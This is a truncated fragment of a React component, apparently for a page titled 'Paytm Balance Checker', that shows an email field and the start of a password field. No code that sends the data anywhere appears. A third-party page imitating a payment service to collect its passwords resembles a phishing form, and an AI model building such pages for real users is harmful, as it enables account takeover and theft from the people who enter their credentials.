...
export default function PaytmPage() {
  ...
  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-cyan-100 to-blue-50">
      <div className="bg-white p-8 rounded-2xl shadow-lg w-full max-w-md border border-blue-200">
        <h1 className="text-2xl font-bold mb-6 text-center text-cyan-700">
          Paytm Balance Checker
        </h1>
        <input
          type="email"
          placeholder="Email"
          ...
          className="w-full p-3 mb-4 border rounded-lg focus:outline-none focus:ring-2 focus:ring-cyan-400"
        />
        <input
          type="password"
